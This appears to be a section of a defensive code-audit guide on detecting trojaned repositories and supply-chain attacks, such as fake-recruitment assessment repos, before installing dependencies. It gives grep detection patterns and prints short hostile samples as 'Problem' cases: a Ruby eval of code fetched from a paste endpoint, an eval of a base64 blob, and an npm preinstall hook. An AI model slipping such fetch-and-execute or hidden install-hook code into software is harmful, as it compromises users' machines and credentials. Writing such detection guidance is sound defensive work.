# Weapon: Supply Chain & Trojaned Code

The engines compare declared dependencies against advisory databases — none of them ask whether the code already sitting in the repo is itself the attack. That question matters most in exactly the case this skill targets: a repo you received rather than wrote — a take-home assessment, an unfamiliar fork, an inherited codebase. Run this weapon **before** `bundle install` / `npm install`: installing is code execution (lifecycle hooks, gemspecs), so a trojaned repo compromises the machine at setup, not at runtime. Files to read: `package.json`, `Gemfile`, `config/initializers/`, `vendor/`, `bin/`, `lib/tasks/`.

Reference: OWASP A08 (Software and Data Integrity Failures). The patterns below are distilled from real credential-stealer samples collected from fake-recruitment campaigns ([malicious-repositories](https://github.com/rubenmarcus/malicious-repositories)); the Rails Security Guide does not cover this territory.

## Deterministic checks (run these, don't guess)

```sh
git grep -nE '(^|[^[:alnum:]_])(eval|instance_eval|class_eval|module_eval|new Function)[ (]' -- app config lib bin vendor   # dynamic execution
git grep -nE '"(pre|post)install"|"prepare":' -- package.json                                                # npm install-time hooks
git grep -nE 'npoint\.io|pastebin\.com|paste\.ee|gist\.githubusercontent'                                    # paste-bin payload endpoints
git grep -nE '(\\x[0-9a-fA-F]{2}){4,}' -- app config lib                                                     # hex-encoded strings hiding identifiers
```

Read every hit before judging: legitimate metaprogramming evals a literal block written in the file; malicious code evals a string it fetched or decoded. The argument's origin is the verdict.

## Remote fetch, local execution

Code that downloads a string and executes it runs whatever the endpoint serves — clean during review, a stealer after. No legitimate Rails pattern does this; the JS twin (`eval(res.data.verification)`, `new Function(payload)()` on an `axios`/`fetch` response) is the signature move of the trojaned-assessment scam.

```ruby
eval(Net::HTTP.get(URI("https://api.npoint.io/ac2916e3f543...")))   # Problem — executes whatever the endpoint serves, today or later
# Fix — none exists; this IS the payload delivery. Stop the audit, don't install, treat the repo as hostile.
```

## Install-time hooks

`preinstall` / `postinstall` / `prepare` scripts run automatically the moment anyone runs `npm install` or `yarn install` — before a single line of app code has been read. A modern Rails app with jsbundling ships a `package.json`, so this surface is common. The Ruby side is the same class: a `path:`/`git:` gem vendored in the repo executes its gemspec (and `extconf.rb` on native builds) during `bundle install`.

```json
"scripts": { "preinstall": "node lib/setup-check.js" }   // Problem — arbitrary code runs at install, before any review
```

```sh
npm install --ignore-scripts   # Fix — read the hook script first; install without executing it until reviewed
```

Benign hooks are everywhere (`husky`, `patch-package`, native-module builds) — read what the script does before accusing; the finding is a hook that fetches, decodes, or touches credentials, not the hook itself.

## Obfuscated blobs

A long base64/hex string that gets decoded and executed is a program wearing a disguise, and minified or obfuscated code in a place that has no build step (an initializer, a config file, `bin/`) has no honest reason to be unreadable. Hex-encoded identifiers (`"\x6c\x6f\x63\x61\x74\x69\x6f\x6e"` spells `location`) exist only to dodge grep.

```ruby
eval(Base64.decode64("cmVxdWlyZSAnbmV0L2h0dHAnOyB..."))   # Problem — the string is the program; you can't judge what you can't read
# Fix — decode it and read the result; the verdict comes from the decoded content, never from trust
```

## Paste-bin configuration endpoints

Boot- or runtime fetches from `npoint.io`, `pastebin`, or raw gists dressed up as "config" or "analytics" are an attacker-controlled channel: the author can swap the content at any time, so it serves clean data during review and a payload in production. Real configuration lives in the repo, credentials, or ENV — never behind a paste service. (Distinct from SSRF in `arsenal/hardening.md`: there an attacker steers a URL the app fetches; here the outbound call is the author's intent.)

```ruby
settings = JSON.parse(Net::HTTP.get(URI("https://api.npoint.io/8f7e945d...")))   # Problem — a remote kill-switch the author controls
settings = Rails.application.config_for(:settings)                               # Fix — config ships with the repo and gets reviewed
```

## Severity and remedies

A confirmed hit — an eval of fetched or decoded content, an install hook that downloads and executes — is **confirmed critical and terminal**: the machine that runs `bundle install`/`npm install` is compromised, so it outranks every in-app finding, and the rest of the audit is moot. Say so, stop, and give the remedy: don't install, don't run the app, rotate any credentials the machine holds, report the repo. Everything short of that path stays theoretical: a literal-block `class_eval` in a concern, a `postinstall` that runs `husky`, a vendored gem from the app's own org — name these as reviewed-and-benign rather than staying silent, because a false "this repo is a trojan" burns trust faster than any other claim in the report. Source-trust siblings: unpinned `git://` gems and CDN importmap pins live in `arsenal/cve.md`; fetch-and-execute inside CI YAML lives in `arsenal/ci-cd.md`.
